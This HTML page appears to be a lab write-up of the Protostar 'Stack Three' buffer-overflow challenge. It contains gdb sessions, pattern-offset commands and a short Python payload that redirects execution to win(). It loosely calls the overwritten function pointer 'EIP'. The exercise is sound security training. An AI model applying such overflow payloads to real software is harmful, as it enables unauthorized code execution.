<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
        <h1><strong>#Protostar - Stack Three</strong></h1>
        <a href="https://exploit.education/protostar/stack-three/">https://exploit.education/protostar/stack-three/</a><br>
        <br>
        <img alt="images\19-1.png" src="images/19-1.png"><br>
        <br>
        To solve Stack Three, we need to redirect code execution to the <code>win()</code> function.<br>
        <br>
        To redirect code execution, we need to overwrite EIP with the address of win().<br>
        EIP is the Instruction Pointer. It points to the next instruction for the CPU to execute.<br>
        If we can overwrite EIP, we have code execution over the whole program/system.<br>
        <br>
        Before we can write this exploit, we need 2 things:<br>
        - the offset to EIP (so that we can overwrite it)<br>
        - the address of the win() function<br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>1) Find offset to EIP</strong></h2><br>
        Log into Protostar and open the stack3 binary in gdb.<br>
            <div class="codebox">
                $&nbsp;gdb&nbsp;-q&nbsp;stack3<br>
                Reading&nbsp;symbols&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack3...done.<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;
            </div>
        </div><br>
        <br>
        On your attacking machine, generate a cyclic pattern using <code>msf-pattern_create</code>.<br>
        On Kali this is located at <code>/usr/share/metasploit-framework/tools/pattern_create.rb</code><br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_create&nbsp;-l&nbsp;100</span><br>
                Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
            </div>
        </div><br>
        <br>
        Back in gdb, run the binary and submit the cyclic pattern.<br>
        The binary should crash.<br>
            <div class="codebox">
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;run&nbsp;<br>
                Starting&nbsp;program<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack3&nbsp;<br>
                Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A<br>
                calling&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;pointer,&nbsp;jumping&nbsp;to&nbsp;0x63413163<br>
                <br>
                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
                0x63413163&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;??&nbsp;<span style="color:#ff9d00;font-weight:700">()</span>
            </div>
        </div><br>
        <br>
        The stack has been overflowed and EIP has been overwritten with <code>0x63413163</code>, which is part of our cyclic pattern.<br>
        <br>
        Submit the contents of EIP to <code>msf-pattern_offset</code>.<br>
        This will tell us the offset at which EIP gets overwritten.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_offset&nbsp;-q&nbsp;0x63413163&nbsp;</span><br>
                [*]&nbsp;Exact&nbsp;match&nbsp;at&nbsp;offset&nbsp;64
            </div>
        </div><br>
        <br>
        Great!<br>
        The offset to overwrite EIP is <code>64</code>,<br>
        which means that we need to write 64 bytes of junk to overflow the buffer and reach EIP.<br>
        <br>
        <a id="h2-2" name="h2-2"></a><strong></strong>
        <h2><strong>2) Find address of win()</strong></h2><br>
        You can use <code>objdump</code> to dump the assembly instructions of the program and their location in memory.<br>
            <div class="codebox">
                $&nbsp;objdump&nbsp;-M&nbsp;intel&nbsp;-d&nbsp;stack3&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;win&nbsp;-A&nbsp;8<br>
                08048424&nbsp;&lt;win&gt;<span style="color:#ff9d00;font-weight:700">:</span><br>
                &nbsp;8048424<span style="color:#ff9d00;font-weight:700">:</span> 55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp;ebp<br>
                &nbsp;8048425<span style="color:#ff9d00;font-weight:700">:</span> 89&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;ebp,esp<br>
                &nbsp;8048427<span style="color:#ff9d00;font-weight:700">:</span> 83&nbsp;ec&nbsp;18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp;esp,0x18<br>
                &nbsp;804842a<span style="color:#ff9d00;font-weight:700">:</span> c7&nbsp;04&nbsp;24&nbsp;40&nbsp;85&nbsp;04&nbsp;08&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[esp],0x8048540<br>
                &nbsp;8048431<span style="color:#ff9d00;font-weight:700">:</span> e8&nbsp;2a&nbsp;ff&nbsp;ff&nbsp;ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp;8048360&nbsp;&lt;puts@plt&gt;<br>
                &nbsp;8048436<span style="color:#ff9d00;font-weight:700">:</span> c9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leave&nbsp;&nbsp;<br>
                &nbsp;8048437<span style="color:#ff9d00;font-weight:700">:</span> c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;
            </div>
        </div><br>
        <br>
        The win() function is located at memory address <code>0x08048424</code>.<br>
        <br>
        <a id="h2-3" name="h2-3"></a><strong></strong>
        <h2><strong>3) Write exploit</strong></h2><br>
        First, we write 64 bytes of junk to fill the <code>buffer</code> variable.<br>
        After that, we overwrite EIP with the address of the win() function.<br>
        <br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Stack&nbsp;Three</span><br>
                <br>
                import&nbsp;struct<br>
                <br>
                win_address&nbsp;=&nbsp;struct.pack<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;0x08048424<span style="color:#ff9d00;font-weight:700">)</span><br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*64<br>
                payload&nbsp;+=&nbsp;win_address<br>
                <br>
                print&nbsp;payload
            </div>
        </div><br>
        <br>
        <a id="h2-4" name="h2-4"></a><strong></strong>
        <h2><strong>4) Win</strong></h2><br>
        Print your payload by running the exploit and pipe it to stack3.<br>
            <div class="codebox">
                $&nbsp;python&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>stack3.py&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>stack3<br>
                calling&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;pointer,&nbsp;jumping&nbsp;to&nbsp;0x08048424<br>
                code&nbsp;flow&nbsp;successfully&nbsp;changed
            </div>
        </div><br>
        <br>
        Success!<br>
        We've overwritten EIP and changed code execution to the win() function.<br>
    </writeup>
</section>

</body>
</html>